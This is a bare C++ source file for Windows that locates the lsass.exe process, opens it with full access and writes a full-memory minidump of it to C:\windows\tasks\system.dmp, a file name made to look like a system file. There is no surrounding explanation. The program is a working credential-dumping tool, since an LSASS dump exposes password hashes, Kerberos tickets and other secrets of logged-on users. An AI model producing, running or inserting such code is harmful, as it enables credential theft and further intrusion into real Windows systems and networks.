#include <windows.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <iostream>
#include <fstream>


DWORD GetLsassPid() {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    DWORD pid = 0;

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry)) {
        while (Process32Next(snapshot, &entry)) {
            if (_wcsicmp(entry.szExeFile, L"lsass.exe") == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }
    CloseHandle(snapshot);
    return pid;
}

bool DumpLsass(DWORD pid, const wchar_t* dumpFilePath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "Failed to open lsass.exe process" << std::endl;
        return false;
    }

    HANDLE hFile = CreateFile(dumpFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create dump file" << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    BOOL success = MiniDumpWriteDump(
        hProcess,
        pid,
        hFile,
        MiniDumpWithFullMemory,
        NULL,
        NULL,
        NULL
    );

    CloseHandle(hFile);
    CloseHandle(hProcess);

    return success == TRUE;
}

int main() {
    DWORD pid = GetLsassPid();
    if (pid == 0) {
        std::cerr << "Could not find lsass.exe process" << std::endl;
        return 1;
    }

    const wchar_t* dumpFilePath = L"C:\\windows\\tasks\\system.dmp";

    if (DumpLsass(pid, dumpFilePath)) {
        std::cout << "Dump successfully created at " << dumpFilePath << std::endl;
    }
    else {
        std::cerr << "Failed to create dump" << std::endl;
    }

    return 0;
}


